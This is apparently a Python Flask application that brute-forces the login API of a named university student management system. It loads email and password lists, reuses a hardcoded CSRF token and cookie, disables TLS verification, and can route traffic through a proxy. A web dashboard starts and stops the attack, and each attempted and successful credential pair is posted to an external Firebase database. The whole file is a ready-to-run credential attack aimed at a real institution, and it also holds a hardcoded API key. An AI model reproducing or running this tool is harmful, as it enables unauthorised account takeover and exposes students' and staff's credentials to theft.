import asyncio
import aiohttp
import os
import json
import random
from urllib.parse import urlparse, quote
from flask import Flask, Response, request, jsonify
import threading
import time
import requests  # For Firebase API calls
import datetime

# =======================
# Config
# =======================
target_base = "https://sms.mzuni.ac.mw"  # target URL
proxychoice = "no"                     # "yes" = use 127.0.0.1:8080, "no" = direct
proxy_url = "http://127.0.0.1:8080"
emails_file = "emails.txt"
passwords_file = "passwords.txt"
rate_limit = 20  # requests per second

# Firebase Configuration
FIREBASE_API_KEY = "AIzaSyB52g3Ncxw5uMKI2PQrD9lje7Yfppb00WY"
FIREBASE_DB_URL = "https://logfile-8349f-default-rtdb.asia-southeast1.firebasedatabase.app"
# =======================

# Hardcoded values from the working template
CSRF_TOKEN = "d9c1f04f4c6278d5a68941ada332897224c22f4848b946ffcac940a4a0984964"
CSRF_COOKIE = "d9c1f04f4c6278d5a68941ada332897224c22f4848b946ffcac940a4a0984964%7C3092d24913e257b40ed49c4dab9f382e68f3812ae12b0ebd1abec2e2b3e29829"
CALLBACK_URL = "https%3A%2F%2Fsms.mzuni.ac.mw%2Flogin"

# Global variables for controlling the brute force process
brute_force_tasks = []
brute_force_running = False
successful_attempts = []
event_queue = asyncio.Queue()
browser_output_count = 0  # Counter for browser output

# Flask app
app = Flask(__name__)

# Firebase functions
def firebase_get(path):
    """Get data from Firebase"""
    try:
        url = f"{FIREBASE_DB_URL}/{path}.json"
        response = requests.get(url)
        return response.json() if response.status_code == 200 else None
    except Exception as e:
        print(f"Firebase GET error: {e}")
        return None

def firebase_post(path, data):
    """Post data to Firebase (append to list)"""
    try:
        url = f"{FIREBASE_DB_URL}/{path}.json"
        response = requests.post(url, json=data)
        return response.json()['name'] if response.status_code == 200 else None
    except Exception as e:
        print(f"Firebase POST error: {e}")
        return None

def firebase_put(path, data):
    """Put data to Firebase"""
    try:
        url = f"{FIREBASE_DB_URL}/{path}.json"
        response = requests.put(url, json=data)
        return response.status_code == 200
    except Exception as e:
        print(f"Firebase PUT error: {e}")
        return False

def log_event(event_type, email, password, status, response_text=""):
    """Log an event to Firebase in the same format as your working code"""
    timestamp = datetime.datetime.utcnow().isoformat()
    combination = f"{email}:{password}"
    
    log_entry = {
        "timestamp": timestamp,
        "event": f"[{event_type}] {combination} {status}",
        "user": "brute_force_app"
    }
    
    if response_text:
        log_entry["response"] = response_text[:100]  # Limit response length
    
    # Save to logs path (as in your working example)
    firebase_post("logs", log_entry)
    
    # Also save to attempted/successful paths for progress tracking
    if event_type == "SUCCESS":
        success_entry = {
            "timestamp": timestamp,
            "combination": combination,
            "email": email,
            "password": password
        }
        firebase_post("successful_attempts", success_entry)
    
    # Always add to attempted combinations
    attempted_data = firebase_get("attempted_combinations") or []
    if combination not in attempted_data:
        attempted_data.append(combination)
        firebase_put("attempted_combinations", attempted_data)


# Progress log management
def load_progress():
    """Load progress from Firebase"""
    progress_data = {
        "attempted_combinations": set(),
        "successful_combinations": []
    }
    
    # Load attempted combinations
    attempted_data = firebase_get("attempted_combinations")
    if attempted_data:
        progress_data["attempted_combinations"] = set(attempted_data)
    
    # Load successful combinations
    successful_data = firebase_get("successful_attempts")
    if successful_data:
        # Convert Firebase object to list of values
        successful_list = []
        for key, value in successful_data.items():
            if isinstance(value, dict):
                successful_list.append(value)
        progress_data["successful_combinations"] = successful_list
    
    return progress_data


async def send_event(msg: str):
    global browser_output_count
    # Print to terminal
    print(msg)
    # Add to event queue for browser
    await event_queue.put(msg)
    browser_output_count += 1


# Worker to brute force one email against all passwords
async def brute_email(session, sem, email, passwords, progress_data):
    for pwd in passwords:
        combination = f"{email}:{pwd}"
        
        # Check if we should stop
        if not brute_force_running:
            await send_event(f"[STOPPED] {email}:{pwd}")
            log_event("STOPPED", email, pwd, "Stopped by user")
            return
            
        # Skip if already attempted
        if combination in progress_data["attempted_combinations"]:
            await send_event(f"[SKIP] Already attempted: {email}:{pwd}")
            continue
            
        await sem.acquire()
        try:
            # URL-encoded form data (exactly like the working template)
            data_str = f"redirect=false&email={quote(email)}&password={quote(pwd)}&csrfToken={CSRF_TOKEN}&callbackUrl={CALLBACK_URL}&json=true"
            
            cookies = {
                '__Host-next-auth.csrf-token': CSRF_COOKIE,
                '__Secure-next-auth.callback-url': CALLBACK_URL,
            }
            
            headers = {
                'Host': 'sms.mzuni.ac.mw',
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.6178.0 Safari/537.36',
                'Content-Type': 'application/x-www-form-urlencoded',
                'Origin': 'https://sms.mzuni.ac.mw',
                'Referer': 'https://sms.mzuni.ac.mw/login',
                'Accept': 'application/json, text/plain, */*',
                'Accept-Language': 'en-US,en;q=0.5',
                'Connection': 'keep-alive',
            }
            
            proxy_arg = proxy_url if proxychoice.lower() == "yes" else None
            
            # Send POST request (exactly like the working template)
            async with session.post(
                'https://sms.mzuni.ac.mw/api/auth/callback/credentials',
                cookies=cookies,
                headers=headers,
                data=data_str,
                proxy=proxy_arg,
                timeout=10,
                ssl=False
            ) as resp:
                status = resp.status
                response_text = await resp.text()
                
                if status == 200:
                    await send_event(f"[SUCCESS] {email}:{pwd}")
                    log_event("SUCCESS", email, pwd, "Authentication successful")
                    successful_attempts.append(f"{email}:{pwd}")
                elif status == 401:
                    await send_event(f"[FAIL] {email}:{pwd}")
                    log_event("FAIL", email, pwd, "Authentication failed")
                else:
                    await send_event(f"[INTERESTING {status}] {email}:{pwd} - Response: {response_text[:100]}")
                    log_event(f"INTERESTING {status}", email, pwd, "Unexpected response", response_text)
                    
        except Exception as e:
            error_msg = str(e)
            await send_event(f"[ERROR] {email}:{pwd} -> {error_msg}")
            log_event("ERROR", email, pwd, f"Exception: {error_msg}")
        finally:
            await asyncio.sleep(1 / rate_limit)
            sem.release()


# Main brute logic
async def brute_main():
    global brute_force_running, brute_force_tasks, browser_output_count
    brute_force_running = True
    
    # Log start event
    log_event("INFO", "system", "system", "Brute force attack started")
    
    # Load inputs
    if not os.path.exists(emails_file):
        await send_event(f"[ERROR] Emails file '{emails_file}' not found")
        log_event("ERROR", "system", "system", f"Emails file '{emails_file}' not found")
        brute_force_running = False
        return
        
    if not os.path.exists(passwords_file):
        await send_event(f"[ERROR] Passwords file '{passwords_file}' not found")
        log_event("ERROR", "system", "system", f"Passwords file '{passwords_file}' not found")
        brute_force_running = False
        return
        
    with open(emails_file) as f:
        emails = [line.strip() for line in f if line.strip()]
    with open(passwords_file) as f:
        passwords = [line.strip() for line in f if line.strip()]

    progress_data = load_progress()
    
    # Count how many combinations we've already attempted
    attempted_count = len(progress_data["attempted_combinations"])
    total_combinations = len(emails) * len(passwords)
    remaining = total_combinations - attempted_count
    
    if remaining <= 0:
        await send_event("[INFO] All combinations already attempted.")
        log_event("INFO", "system", "system", "All combinations already attempted")
        brute_force_running = False
        return

    await send_event(f"[INFO] Starting attack. Already attempted: {attempted_count}/{total_combinations}")
    await send_event(f"[INFO] Remaining combinations: {remaining}")
    await send_event(f"[INFO] Successful so far: {len(progress_data['successful_combinations'])}")
    await send_event(f"[INFO] Using hardcoded CSRF token: {CSRF_TOKEN}")
    
    log_event("INFO", "system", "system", f"Starting attack. Already attempted: {attempted_count}/{total_combinations}")
    log_event("INFO", "system", "system", f"Remaining combinations: {remaining}")
    log_event("INFO", "system", "system", f"Successful so far: {len(progress_data['successful_combinations'])}")

    sem = asyncio.Semaphore(rate_limit)
    connector = aiohttp.TCPConnector(ssl=False, limit=0)
    async with aiohttp.ClientSession(connector=connector) as session:
        tasks = []
        for email in emails:
            if not brute_force_running:
                break
            task = asyncio.create_task(brute_email(session, sem, email, passwords, progress_data))
            tasks.append(task)
            brute_force_tasks.append(task)
        
        await asyncio.gather(*tasks, return_exceptions=True)
    
    brute_force_running = False
    await send_event("[INFO] Brute force completed")
    log_event("INFO", "system", "system", "Brute force completed")


# Stop the brute force process
async def stop_brute():
    global brute_force_running, brute_force_tasks
    brute_force_running = False
    
    # Cancel all running tasks
    for task in brute_force_tasks:
        if not task.done():
            task.cancel()
    
    brute_force_tasks = []
    await send_event("[INFO] Brute force stopped by user")
    log_event("INFO", "system", "system", "Brute force stopped by user")


def run_async_task(coro):
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    loop.run_until_complete(coro)
    loop.close()


# =======================
# Flask Routes
# =======================

@app.route('/')
def index():
    # Load successful attempts for display
    progress_data = load_progress()
    success_count = len(progress_data["successful_combinations"])
    success_list = "\n".join([f"<li>{s['combination']}</li>" for s in progress_data["successful_combinations"]])
    
    return f"""
<!DOCTYPE html>
<html>
<head>
  <title>Brute Forcer</title>
  <style>
    body {{ font-family: Arial, sans-serif; margin: 20px; }}
    button {{ padding: 10px 20px; font-size: 16px; margin-bottom: 20px; margin-right: 10px; }}
    .start {{ background-color: #4CAF50; color: white; }}
    .stop {{ background-color: #f44336; color: white; }}
    .container {{ display: flex; gap: 20px; }}
    .output, .success {{ 
        background: #f4f4f4; 
        padding: 10px; 
        border: 1px solid #ddd; 
        height: 500px; 
        overflow-y: auto;
        flex: 1;
    }}
    .success {{ background: #e8f5e9; }}
    h3 {{ margin-top: 0; }}
  </style>
</head>
<body>
  <h2>Clusterbomb Brute Force Simulator</h2>
  <button class="start" onclick="startBrute()">Start Brute Force</button>
  <button class="stop" onclick="stopBrute()">Stop Brute Force</button>
  
  <div class="container">
    <div class="output">
      <h3>Attack Log</h3>
      <pre id="out"></pre>
    </div>
    
    <div class="success">
      <h3>Successful Attempts (<span id="success-count">{success_count}</span>)</h3>
      <ul id="success-list">
        {success_list}
      </ul>
    </div>
  </div>
  
  <script>
    const out = document.getElementById('out');
    const successList = document.getElementById('success-list');
    const successCount = document.getElementById('success-count');
    let eventSource = null;
    let outputCount = 0;
    const MAX_OUTPUT_LINES = 60;
    
    // Function to auto-scroll an element to the bottom
    function autoScroll(element) {{
      element.scrollTop = element.scrollHeight;
    }}
    
    function startBrute() {{
      // Stop any existing connection
      if (eventSource) {{
        eventSource.close();
      }}
      
      fetch('/start');
      eventSource = new EventSource('/events');
      eventSource.onmessage = e => {{
        const data = e.data;
        
        // Clear output if we've reached the limit
        if (outputCount >= MAX_OUTPUT_LINES) {{
          out.textContent = "";
          outputCount = 0;
        }}
        
        out.textContent += data + "\\n";
        outputCount++;
        
        // Auto-scroll the output container
        autoScroll(out.parentElement);
        
        // If it's a success, add to the success list
        if (data.includes('[SUCCESS]')) {{
          const combination = data.split('[SUCCESS] ')[1];
          const li = document.createElement('li');
          li.textContent = combination;
          successList.appendChild(li);
          
          // Update success count
          successCount.textContent = parseInt(successCount.textContent) + 1;
          
          // Auto-scroll the success container
          autoScroll(successList.parentElement);
        }}
      }};
    }}
    
    function stopBrute() {{
      fetch('/stop');
      if (eventSource) {{
        eventSource.close();
        eventSource = null;
      }}
    }}
    
    // Auto-start if we were previously running (after page refresh)
    window.onload = function() {{
      fetch('/status')
        .then(response => response.json())
        .then(data => {{
          if (data.running) {{
            startBrute();
          }}
        }});
        
      // Auto-scroll both containers on page load
      autoScroll(out.parentElement);
      autoScroll(successList.parentElement);
    }};
  </script>
</body>
</html>
"""


@app.route('/start')
def start_brute():
    if not brute_force_running:
        thread = threading.Thread(target=run_async_task, args=(brute_main(),))
        thread.daemon = True
        thread.start()
        return "started"
    return "already running"


@app.route('/stop')
def stop_brute():
    thread = threading.Thread(target=run_async_task, args=(stop_brute(),))
    thread.daemon = True
    thread.start()
    return "stopping"


@app.route('/events')
def events():
    def generate():
        while True:
            try:
                # Use asyncio to get events from the queue
                loop = asyncio.new_event_loop()
                asyncio.set_event_loop(loop)
                msg = loop.run_until_complete(event_queue.get())
                loop.close()
                yield f"data: {msg}\n\n"
            except:
                time.sleep(0.1)
                continue
    
    return Response(generate(), mimetype='text/event-stream')


@app.route('/status')
def status():
    progress_data = load_progress()
    return jsonify({
        "running": brute_force_running,
        "successful": len(progress_data["successful_combinations"]),
        "attempted": len(progress_data["attempted_combinations"])
    })


if __name__ == "__main__":
    port = 5500
    print(f"Starting Flask app on port {port}")
    app.run(host='0.0.0.0', port=port, debug=False)